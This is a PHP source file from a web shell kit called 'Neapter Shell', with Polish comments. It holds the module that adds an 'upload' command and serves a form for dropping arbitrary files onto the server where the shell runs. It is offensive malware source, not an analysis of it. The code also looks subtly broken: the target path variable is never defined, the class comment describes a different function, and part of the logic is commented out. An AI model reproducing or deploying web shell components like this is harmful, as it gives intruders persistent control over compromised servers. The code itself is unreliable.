<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Zmienianie uprawnien dla pliku
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleUpload extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public static function getCommands()
    {
        return array('upload');
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public static function getVersion()
    {
        /**
         * Wersja Data Autor
         */
        return '1.0.0 2016-02-26 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @access public
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
upload - Wrzucanie pliku na serwer

    Użycie:
        upload /tmp/plik.php
DATA;
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {
        /**
         * Zapis do pliku
         */
        if (($aFiledata = Request::getFiles('file')) !== FALSE) {
            return move_uploaded_file($aFiledata['tmp_name'], $sFile);
        }
        /**
         * Formularz
         */
        return sprintf('<form action="%s" method="post" enctype="multipart/form-data">' .
            '<pre id="console"><h1>Wrzuć plik</h1><input type="file" name="file"/></pre>' .
            '<input type="text" name="cmd" value="%s" size="110" id="cmd"/>' .
            '<input type="submit" name="submit" value="Wrzuć" id="cmd-send"/></form>',
            Request::getCurrentUrl(),
            htmlspecialchars(Request::getPost('cmd'))
        );


        // $mContent = $this->getCommandUpload($this->sArgv);

        // if (is_bool($mContent)) {
        //     $sConsole = sprintf('Plik %szostał wrzucony', (!$mContent ? 'nie ' : NULL));
        // } /**
        //  * Help
        //  */
        // else if (strncmp($mContent, '<form', 5) !== 0) {
        //     $sConsole = $mContent;
        // } /**
        //  * Formularz sluzacy do wrzucenia pliku
        //  */
        // else {
        //     $bOwnContent = TRUE;
        //     $sContent = $mContent;
        // }
    }

}
